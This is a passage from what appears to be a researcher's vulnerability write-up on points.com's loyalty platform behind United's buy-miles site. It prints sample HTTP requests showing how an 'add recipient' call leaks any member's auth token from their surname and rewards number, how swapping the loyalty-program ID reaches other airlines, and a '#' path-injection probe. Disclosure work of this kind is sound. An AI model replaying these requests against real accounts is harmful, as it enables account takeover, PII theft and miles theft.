<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2F_2P5YI18OR4quqRkLmkt4Tv14a9l9dCVUxkTB6lEJy_gF6OAcpjfonYrIrBo3G4V2HhqdINnzP3Pg2uthj5Qf9hsBea1j9Kxt4I-gxOVKtVybMSOsfoD6p6EkObXdl9gPuwdY1On04XTMjdIzI7kuIc&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2F_2P5YI18OR4quqRkLmkt4Tv14a9l9dCVUxkTB6lEJy_gF6OAcpjfonYrIrBo3G4V2HhqdINnzP3Pg2uthj5Qf9hsBea1j9Kxt4I-gxOVKtVybMSOsfoD6p6EkObXdl9gPuwdY1On04XTMjdIzI7kuIc&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2F_2P5YI18OR4quqRkLmkt4Tv14a9l9dCVUxkTB6lEJy_gF6OAcpjfonYrIrBo3G4V2HhqdINnzP3Pg2uthj5Qf9hsBea1j9Kxt4I-gxOVKtVybMSOsfoD6p6EkObXdl9gPuwdY1On04XTMjdIzI7kuIc&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2F_2P5YI18OR4quqRkLmkt4Tv14a9l9dCVUxkTB6lEJy_gF6OAcpjfonYrIrBo3G4V2HhqdINnzP3Pg2uthj5Qf9hsBea1j9Kxt4I-gxOVKtVybMSOsfoD6p6EkObXdl9gPuwdY1On04XTMjdIzI7kuIc&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2F_2P5YI18OR4quqRkLmkt4Tv14a9l9dCVUxkTB6lEJy_gF6OAcpjfonYrIrBo3G4V2HhqdINnzP3Pg2uthj5Qf9hsBea1j9Kxt4I-gxOVKtVybMSOsfoD6p6EkObXdl9gPuwdY1On04XTMjdIzI7kuIc&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2F_2P5YI18OR4quqRkLmkt4Tv14a9l9dCVUxkTB6lEJy_gF6OAcpjfonYrIrBo3G4V2HhqdINnzP3Pg2uthj5Qf9hsBea1j9Kxt4I-gxOVKtVybMSOsfoD6p6EkObXdl9gPuwdY1On04XTMjdIzI7kuIc&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2F_2P5YI18OR4quqRkLmkt4Tv14a9l9dCVUxkTB6lEJy_gF6OAcpjfonYrIrBo3G4V2HhqdINnzP3Pg2uthj5Qf9hsBea1j9Kxt4I-gxOVKtVybMSOsfoD6p6EkObXdl9gPuwdY1On04XTMjdIzI7kuIc&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2F_2P5YI18OR4quqRkLmkt4Tv14a9l9dCVUxkTB6lEJy_gF6OAcpjfonYrIrBo3G4V2HhqdINnzP3Pg2uthj5Qf9hsBea1j9Kxt4I-gxOVKtVybMSOsfoD6p6EkObXdl9gPuwdY1On04XTMjdIzI7kuIc&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2F_2P5YI18OR4quqRkLmkt4Tv14a9l9dCVUxkTB6lEJy_gF6OAcpjfonYrIrBo3G4V2HhqdINnzP3Pg2uthj5Qf9hsBea1j9Kxt4I-gxOVKtVybMSOsfoD6p6EkObXdl9gPuwdY1On04XTMjdIzI7kuIc&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>Our initial thought here was "how do we get access to use the API on behalf of a rewards program?", and after exploring a bit, we found the "console.points.com" website which allowed public registration for rewards programs to create skeleton accounts that had to be manually approved.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2F7P2e-03SgzlTI8xxmn6X21f2ugydyrvRZ56u5YuHQhdrep-YcstLblWCpzwAvCkKasm0WUciJplWHgwPpYn384IZed6KMobHrmAtQ_Hcw3tdpjbt6URYpZljMd9uRbUgsYRQ6rvpVve69ARF2HGh6iA&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2F7P2e-03SgzlTI8xxmn6X21f2ugydyrvRZ56u5YuHQhdrep-YcstLblWCpzwAvCkKasm0WUciJplWHgwPpYn384IZed6KMobHrmAtQ_Hcw3tdpjbt6URYpZljMd9uRbUgsYRQ6rvpVve69ARF2HGh6iA&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2F7P2e-03SgzlTI8xxmn6X21f2ugydyrvRZ56u5YuHQhdrep-YcstLblWCpzwAvCkKasm0WUciJplWHgwPpYn384IZed6KMobHrmAtQ_Hcw3tdpjbt6URYpZljMd9uRbUgsYRQ6rvpVve69ARF2HGh6iA&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2F7P2e-03SgzlTI8xxmn6X21f2ugydyrvRZ56u5YuHQhdrep-YcstLblWCpzwAvCkKasm0WUciJplWHgwPpYn384IZed6KMobHrmAtQ_Hcw3tdpjbt6URYpZljMd9uRbUgsYRQ6rvpVve69ARF2HGh6iA&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2F7P2e-03SgzlTI8xxmn6X21f2ugydyrvRZ56u5YuHQhdrep-YcstLblWCpzwAvCkKasm0WUciJplWHgwPpYn384IZed6KMobHrmAtQ_Hcw3tdpjbt6URYpZljMd9uRbUgsYRQ6rvpVve69ARF2HGh6iA&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2F7P2e-03SgzlTI8xxmn6X21f2ugydyrvRZ56u5YuHQhdrep-YcstLblWCpzwAvCkKasm0WUciJplWHgwPpYn384IZed6KMobHrmAtQ_Hcw3tdpjbt6URYpZljMd9uRbUgsYRQ6rvpVve69ARF2HGh6iA&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2F7P2e-03SgzlTI8xxmn6X21f2ugydyrvRZ56u5YuHQhdrep-YcstLblWCpzwAvCkKasm0WUciJplWHgwPpYn384IZed6KMobHrmAtQ_Hcw3tdpjbt6URYpZljMd9uRbUgsYRQ6rvpVve69ARF2HGh6iA&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2F7P2e-03SgzlTI8xxmn6X21f2ugydyrvRZ56u5YuHQhdrep-YcstLblWCpzwAvCkKasm0WUciJplWHgwPpYn384IZed6KMobHrmAtQ_Hcw3tdpjbt6URYpZljMd9uRbUgsYRQ6rvpVve69ARF2HGh6iA&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2F7P2e-03SgzlTI8xxmn6X21f2ugydyrvRZ56u5YuHQhdrep-YcstLblWCpzwAvCkKasm0WUciJplWHgwPpYn384IZed6KMobHrmAtQ_Hcw3tdpjbt6URYpZljMd9uRbUgsYRQ6rvpVve69ARF2HGh6iA&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>After authenticating to this portal, we observed that it was an administration console for the rewards programs where they could initialize and manage OAuth-type apps. The apps were provisioned API keys that interacted with the "LCP API" (short for "Loyalty Commerce Platform") which was the "lcp.points.com" host.</p>
<p>The next thing we did was examine the JavaScript that powered the dashboard. We discovered that the website "console.points.com" appeared to be utilized by points.com employees for executing administrative actions concerning customer accounts, rewards programs, and managing components of the website itself.</p>
<p>The rewards program API used by rewards programs to manage points and customer accounts (lcp.points.com) required two keys to interact with it, both of which were distributed when you registered to the console.points.com website:</p>
<ul>
<li>macKeyIdentifier: essentially an OAuth client_id</li>
<li>macKey: essentially an OAuth client_secret</li>
</ul>
<p>Using the above two variables that we obtain by registering an app on "console.points.com", we were able to sign HTTP requests to the "lcp.points.com" host via the OAuth 2.0 MAC authentication scheme and call the loyalty platform API.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Flh5.googleusercontent.com%2F5zYgRBbnCgkIJI4sh1Y3TaiUopPSGq4gg3SUHaAay1zmHfZKYEcq4WN7jF6OEA_oe2DYWEJcYa3pYBYVaqWSXrDIHbIzS5CmBb-YE41QFv3h861mNt3_Ef57JONW_H240qzkdcOOzDoP1WJPnzs53bM&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh5.googleusercontent.com%2F5zYgRBbnCgkIJI4sh1Y3TaiUopPSGq4gg3SUHaAay1zmHfZKYEcq4WN7jF6OEA_oe2DYWEJcYa3pYBYVaqWSXrDIHbIzS5CmBb-YE41QFv3h861mNt3_Ef57JONW_H240qzkdcOOzDoP1WJPnzs53bM&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh5.googleusercontent.com%2F5zYgRBbnCgkIJI4sh1Y3TaiUopPSGq4gg3SUHaAay1zmHfZKYEcq4WN7jF6OEA_oe2DYWEJcYa3pYBYVaqWSXrDIHbIzS5CmBb-YE41QFv3h861mNt3_Ef57JONW_H240qzkdcOOzDoP1WJPnzs53bM&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh5.googleusercontent.com%2F5zYgRBbnCgkIJI4sh1Y3TaiUopPSGq4gg3SUHaAay1zmHfZKYEcq4WN7jF6OEA_oe2DYWEJcYa3pYBYVaqWSXrDIHbIzS5CmBb-YE41QFv3h861mNt3_Ef57JONW_H240qzkdcOOzDoP1WJPnzs53bM&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh5.googleusercontent.com%2F5zYgRBbnCgkIJI4sh1Y3TaiUopPSGq4gg3SUHaAay1zmHfZKYEcq4WN7jF6OEA_oe2DYWEJcYa3pYBYVaqWSXrDIHbIzS5CmBb-YE41QFv3h861mNt3_Ef57JONW_H240qzkdcOOzDoP1WJPnzs53bM&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh5.googleusercontent.com%2F5zYgRBbnCgkIJI4sh1Y3TaiUopPSGq4gg3SUHaAay1zmHfZKYEcq4WN7jF6OEA_oe2DYWEJcYa3pYBYVaqWSXrDIHbIzS5CmBb-YE41QFv3h861mNt3_Ef57JONW_H240qzkdcOOzDoP1WJPnzs53bM&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh5.googleusercontent.com%2F5zYgRBbnCgkIJI4sh1Y3TaiUopPSGq4gg3SUHaAay1zmHfZKYEcq4WN7jF6OEA_oe2DYWEJcYa3pYBYVaqWSXrDIHbIzS5CmBb-YE41QFv3h861mNt3_Ef57JONW_H240qzkdcOOzDoP1WJPnzs53bM&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh5.googleusercontent.com%2F5zYgRBbnCgkIJI4sh1Y3TaiUopPSGq4gg3SUHaAay1zmHfZKYEcq4WN7jF6OEA_oe2DYWEJcYa3pYBYVaqWSXrDIHbIzS5CmBb-YE41QFv3h861mNt3_Ef57JONW_H240qzkdcOOzDoP1WJPnzs53bM&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Flh5.googleusercontent.com%2F5zYgRBbnCgkIJI4sh1Y3TaiUopPSGq4gg3SUHaAay1zmHfZKYEcq4WN7jF6OEA_oe2DYWEJcYa3pYBYVaqWSXrDIHbIzS5CmBb-YE41QFv3h861mNt3_Ef57JONW_H240qzkdcOOzDoP1WJPnzs53bM&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>The fact that the platform employed this form of authorization was somewhat frustrating as it both meant we'd have to write a wrapper for signing HTTP requests to fuzz the API and that the secret key wouldn't be included in HTTP requests sent by the rewards programs. If we found a vulnerability like SSRF on an airline program, for example, the key itself would not be leaked to us, only the signature for the specific HTTP request that the airline was trying to make.</p>
<p>We fuzzed the API for a long time (manually signing each HTTP request using a Python script) and failed to find any one-off authorization vulnerabilities. It was trivial to find the numeric IDs of other airline programs, but unfortunately we were unable to find any basic core API vulnerabilities like IDOR or privilege escalation. We decided to change routes to better understand how the publicly listed customer rewards programs were using the points.com infrastructure.</p>
<h2 id="exploring-the-united-airlines-points-management-website">Exploring the United Airlines Points Management Website</h2>
<p>Since United Airlines was leveraging points.com for their rewards program, we thought it would be interesting to test one of their apps that was integrated with points.com. We found the following MileagePlus domain which was used to buy, transfer, and manage MileagePlus miles:</p>
<pre><code>https://buymiles.mileageplus.com/united/united_landing_page/#/en-US
</code></pre>
<p>After fuzzing the site for a little while, we soon realized that the "buymiles.mileageplus.com" website was actually hosted by points.com and not United Airlines. We became super curious how the website worked from an authorization perspective and began to test the intended functionality of the site.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2F1XGVc3pi9VRxJ_XKj8sZ8Cz0HDcZAXzx-IsyFv_TrBPRkajKtQdoxnnY7AngtJBJLPKQguuCGni6dsje1ulngL8kqBSXWEg6fYvuMRlHng4dgvLDsGixIZZ8WzwbqjY1erEfLxjBDHUO7gbck_MoMwk&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2F1XGVc3pi9VRxJ_XKj8sZ8Cz0HDcZAXzx-IsyFv_TrBPRkajKtQdoxnnY7AngtJBJLPKQguuCGni6dsje1ulngL8kqBSXWEg6fYvuMRlHng4dgvLDsGixIZZ8WzwbqjY1erEfLxjBDHUO7gbck_MoMwk&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2F1XGVc3pi9VRxJ_XKj8sZ8Cz0HDcZAXzx-IsyFv_TrBPRkajKtQdoxnnY7AngtJBJLPKQguuCGni6dsje1ulngL8kqBSXWEg6fYvuMRlHng4dgvLDsGixIZZ8WzwbqjY1erEfLxjBDHUO7gbck_MoMwk&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2F1XGVc3pi9VRxJ_XKj8sZ8Cz0HDcZAXzx-IsyFv_TrBPRkajKtQdoxnnY7AngtJBJLPKQguuCGni6dsje1ulngL8kqBSXWEg6fYvuMRlHng4dgvLDsGixIZZ8WzwbqjY1erEfLxjBDHUO7gbck_MoMwk&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2F1XGVc3pi9VRxJ_XKj8sZ8Cz0HDcZAXzx-IsyFv_TrBPRkajKtQdoxnnY7AngtJBJLPKQguuCGni6dsje1ulngL8kqBSXWEg6fYvuMRlHng4dgvLDsGixIZZ8WzwbqjY1erEfLxjBDHUO7gbck_MoMwk&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2F1XGVc3pi9VRxJ_XKj8sZ8Cz0HDcZAXzx-IsyFv_TrBPRkajKtQdoxnnY7AngtJBJLPKQguuCGni6dsje1ulngL8kqBSXWEg6fYvuMRlHng4dgvLDsGixIZZ8WzwbqjY1erEfLxjBDHUO7gbck_MoMwk&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2F1XGVc3pi9VRxJ_XKj8sZ8Cz0HDcZAXzx-IsyFv_TrBPRkajKtQdoxnnY7AngtJBJLPKQguuCGni6dsje1ulngL8kqBSXWEg6fYvuMRlHng4dgvLDsGixIZZ8WzwbqjY1erEfLxjBDHUO7gbck_MoMwk&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2F1XGVc3pi9VRxJ_XKj8sZ8Cz0HDcZAXzx-IsyFv_TrBPRkajKtQdoxnnY7AngtJBJLPKQguuCGni6dsje1ulngL8kqBSXWEg6fYvuMRlHng4dgvLDsGixIZZ8WzwbqjY1erEfLxjBDHUO7gbck_MoMwk&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2F1XGVc3pi9VRxJ_XKj8sZ8Cz0HDcZAXzx-IsyFv_TrBPRkajKtQdoxnnY7AngtJBJLPKQguuCGni6dsje1ulngL8kqBSXWEg6fYvuMRlHng4dgvLDsGixIZZ8WzwbqjY1erEfLxjBDHUO7gbck_MoMwk&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>We continued using the "buymiles.mileageplus.com" website normally and observed the following flow after attempting to buy miles:</p>
<ol>
<li>Click "Buy miles" on the "buymiles.mileageplus.com" website</li>
<li>Observe you are redirected to "<a href="http://www.united.com/">www.united.com</a>"<!-- --> where we authenticate to an OAuth-type flow using our United MileagePlus username and password</li>
<li>Observe you are redirected via the "redirect_uri" parameter to "buymiles.mileageplus.com" which then sends the following HTTP request using the authorization token obtained from authenticating with our username and password on "<a href="http://www.united.com/">www.united.com</a>":</li>
</ol>
<p><strong>HTTP Request</strong></p>
<pre><code>POST /mileage-plus/sessions/sso HTTP/<span>2</span>
Host<span>:</span> buymiles.mileageplus.com
Content-Type<span>:</span> application/json

<span>{</span><span>"mvUrl"</span><span>:</span><span>"www_united_com_auth_token"</span><span>}</span>
</code></pre>
<p><strong>HTTP Response</strong></p>
<pre><code>HTTP/<span>2</span> <span>201</span> Created
Content-type<span>:</span> application/json

<span>{</span><span>"memberValidation"</span><span>:</span> <span>"points_com_user_auth_token"</span><span>}</span>
</code></pre>
<ol start="4">
<li>Using the returned "memberValidation" token from the above HTTP response, send another HTTP request to the following endpoint where "memberDetails" is the returned "memberValidation" token:</li>
</ol>
<p><strong>HTTP Request</strong></p>
<pre><code>POST /payments/authentications/ HTTP/<span>2</span>
Host<span>:</span> buymiles.mileageplus.com
Content-Type<span>:</span> application/json

<span>{</span><span>"currency"</span><span>:</span><span>"USD"</span><span>,</span><span>"memberDetails"</span><span>:</span><span>"points_com_user_auth_token"</span><span>,</span><span>"transactionType"</span><span>:</span><span>"buy_storefront"</span><span>}</span>
</code></pre>
<p><strong>HTTP Response</strong></p>
<pre><code>HTTP/<span>201</span> Created
Content-type<span>:</span> application/json

<span>{</span><span>"email"</span><span>:</span> <span>"example@gmail.com"</span><span>,</span> <span>"firstName"</span><span>:</span> <span>"Samuel"</span><span>,</span> <span>"lastName"</span><span>:</span> <span>"Curry"</span><span>,</span> <span>"memberId"</span><span>:</span> <span>"EH123456"</span><span>}</span>
</code></pre>
<p>After completing the OAuth-type flow, it appeared that the "memberValidation" token acted as a user authorization token for the points.com airline tenant whereby we could use this token repeatedly to perform API calls and authenticate as a user.</p>
<p>If we could generate this token for another user, we would be able to perform actions on their account like transferring airline miles and retrieving their personal information. This became one of our goals as we learned more about how the airline website was leveraging the points.com infrastructure, and something we explored further.</p>
<h2 id="1-improper-authorization-on-points-recipient-endpoint-allows-attacker-to-authenticate-as-any-user-using-only-surname-and-rewards-number">(1) Improper Authorization on Points Recipient Endpoint Allows Attacker to Authenticate as Any User Using Only Surname and Rewards Number</h2>
<p>As we continued to look for issues which would allow us to leak someone's "memberValidation" token, one flow we found on the United website titled&nbsp; "Buy miles for someone else".</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2FbjX3VX9MG4yLqSrq_JjoXc0y4rjPGpgiZUmbeGZTwtuBI4uCzW9ZeLBE4OYAExUkZgEi4Wsp1yC0CfhCwdnHfTAksQrc9B1TBDDzx-JHtDwRUV22tdvaIxcViLj8CKsM8l-fh_6rIMYEXuP35fNxnaI&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2FbjX3VX9MG4yLqSrq_JjoXc0y4rjPGpgiZUmbeGZTwtuBI4uCzW9ZeLBE4OYAExUkZgEi4Wsp1yC0CfhCwdnHfTAksQrc9B1TBDDzx-JHtDwRUV22tdvaIxcViLj8CKsM8l-fh_6rIMYEXuP35fNxnaI&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2FbjX3VX9MG4yLqSrq_JjoXc0y4rjPGpgiZUmbeGZTwtuBI4uCzW9ZeLBE4OYAExUkZgEi4Wsp1yC0CfhCwdnHfTAksQrc9B1TBDDzx-JHtDwRUV22tdvaIxcViLj8CKsM8l-fh_6rIMYEXuP35fNxnaI&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2FbjX3VX9MG4yLqSrq_JjoXc0y4rjPGpgiZUmbeGZTwtuBI4uCzW9ZeLBE4OYAExUkZgEi4Wsp1yC0CfhCwdnHfTAksQrc9B1TBDDzx-JHtDwRUV22tdvaIxcViLj8CKsM8l-fh_6rIMYEXuP35fNxnaI&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2FbjX3VX9MG4yLqSrq_JjoXc0y4rjPGpgiZUmbeGZTwtuBI4uCzW9ZeLBE4OYAExUkZgEi4Wsp1yC0CfhCwdnHfTAksQrc9B1TBDDzx-JHtDwRUV22tdvaIxcViLj8CKsM8l-fh_6rIMYEXuP35fNxnaI&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2FbjX3VX9MG4yLqSrq_JjoXc0y4rjPGpgiZUmbeGZTwtuBI4uCzW9ZeLBE4OYAExUkZgEi4Wsp1yC0CfhCwdnHfTAksQrc9B1TBDDzx-JHtDwRUV22tdvaIxcViLj8CKsM8l-fh_6rIMYEXuP35fNxnaI&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2FbjX3VX9MG4yLqSrq_JjoXc0y4rjPGpgiZUmbeGZTwtuBI4uCzW9ZeLBE4OYAExUkZgEi4Wsp1yC0CfhCwdnHfTAksQrc9B1TBDDzx-JHtDwRUV22tdvaIxcViLj8CKsM8l-fh_6rIMYEXuP35fNxnaI&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2FbjX3VX9MG4yLqSrq_JjoXc0y4rjPGpgiZUmbeGZTwtuBI4uCzW9ZeLBE4OYAExUkZgEi4Wsp1yC0CfhCwdnHfTAksQrc9B1TBDDzx-JHtDwRUV22tdvaIxcViLj8CKsM8l-fh_6rIMYEXuP35fNxnaI&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2FbjX3VX9MG4yLqSrq_JjoXc0y4rjPGpgiZUmbeGZTwtuBI4uCzW9ZeLBE4OYAExUkZgEi4Wsp1yC0CfhCwdnHfTAksQrc9B1TBDDzx-JHtDwRUV22tdvaIxcViLj8CKsM8l-fh_6rIMYEXuP35fNxnaI&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>When you landed on this page as an authenticated MileagePlus user, it would ask you to add a recipient to send miles to. The recipient input field took in a first name, last name, and a MileagePlus number. When we sent the HTTP request to add the recipient, we noticed something super interesting returned in the response:</p>
<p><strong>HTTP Request</strong></p>
<pre><code>POST /mileage-plus/mvs/recipient HTTP/<span>2</span>
Host<span>:</span> buymiles.mileageplus.com
Content-Type<span>:</span> application/json

<span>{</span><span>"mvPayload"</span><span>:</span><span>{</span><span>"identifyingFactors"</span><span>:</span><span>{</span><span>"firstName"</span><span>:</span><span>"Victim"</span><span>,</span><span>"lastName"</span><span>:</span><span>"Victim"</span><span>,</span><span>"memberId"</span><span>:</span><span>"EH123456"</span><span>}</span><span>}</span><span>,</span><span>"lpId"</span><span>:</span><span>"loyalty_program_uuid"</span><span>}</span>
</code></pre>
<p><strong>HTTP Response</strong></p>
<pre><code>HTTP/<span>2</span> <span>201</span> Created
Content-type<span>:</span> application/json

<span>{</span><span>"memberId"</span><span>:</span> <span>"EH123456"</span><span>,</span> <span>"links"</span><span>:</span> <span>{</span><span>"self"</span><span>:</span> <span>{</span><span>"href"</span><span>:</span> <span>"points_com_user_auth_token"</span><span>}</span><span>}</span><span>,</span> <span>"membershipLevel"</span><span>:</span> <span>"1"</span><span>}</span>
</code></pre>
<p>The HTTP response contained the member's authorization token, something that we previously learned is used to retrieve their information and transfer miles on their behalf!</p>
<p>The vulnerability worked like this: by sending their first name, last name, and rewards number through the normal website UI for adding a points recipient, the server would return an authorization token in the HTTP response which could be used to retrieve their billing address, phone number, email, redacted credit card information, and billing history. We could additionally transfer miles on their behalf using this token.</p>
<p>To use the leaked token, we could simply take it and plug it into any of the API calls on the website and perform actions like transferring miles or simply retrieving the member's PII. We were able to fully authenticate into the victim account by only knowing their surname and rewards point number!</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2F3_screenshot.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2F3_screenshot.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2F3_screenshot.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2F3_screenshot.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2F3_screenshot.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2F3_screenshot.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2F3_screenshot.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2F3_screenshot.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2F3_screenshot.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<h3 id="escalating-the-issue-to-affect-other-rewards-programs">Escalating the issue to affect other rewards programs</h3>
<p>At this point, after discovering it was possible to access customer accounts knowing only their surname and rewards number, we were curious if there were other endpoints on the "buymiles.mileageplus.com" site that had similar permission issues but didn't require us to know any prerequisite information about the customer (our bug felt very lame at this time).</p>
<p>We noticed that there was a parameter present in the original vulnerable HTTP request for generating member authorization tokens called "lpId''. According to the LCP API documentation, this parameter referred to the loyalty program UUID (e.g. Delta, United, Southwest, etc.). It appeared that the API on United's website was hitting the same API which other programs like Delta or Emirates used.</p>
<p>We were able to validate that we could exploit this vulnerability to access other rewards program customer accounts by swapping the loyalty program UUID and user rewards number to that of another program from our first vulnerability. If we swapped the loyalty UUID and rewards number to a Delta customer, it would return the authorization token a victim within the different rewards program.</p>
<p>Interestingly, this behavior also demonstrated that this was hitting a universal points.com API which seemed to be connected to all loyalty programs versus only United Airlines.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fdelta-skymiles.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fdelta-skymiles.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fdelta-skymiles.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fdelta-skymiles.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fdelta-skymiles.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fdelta-skymiles.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fdelta-skymiles.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fdelta-skymiles.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fdelta-skymiles.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>After escalating the issue to generating authorization tokens for any airline, we began to fuzz the vulnerable HTTP request and soon realized that the loyalty program UUID parameter was being sent as an HTTP path argument to a proxied HTTP server.</p>
<p>We discovered this by observing strange behavior when appending a question mark and pound symbol at the end of the loyalty program ID parameter, breaking the HTTP request being sent by the server:</p>
<p><strong>HTTP Request</strong></p>
<pre><code>POST /mileage-plus-transfer/mvs/recipient HTTP/<span>1.1</span>
Host<span>:</span> buymiles.mileageplus.com

<span>{</span><span>"mvPayload"</span><span>:</span><span>{</span><span>}</span><span>,</span><span>"lpId"</span><span>:</span><span>"0ccbb8ee-5129-44dd-9f66-a79eb853da73**#**"</span><span>}</span> &lt;-- pound symbol appended
</code></pre>
<p><strong>HTTP Response</strong></p>
<pre><code>HTTP/<span>1.1</span> <span>400</span> Bad Request
Content-type<span>:</span> application/json

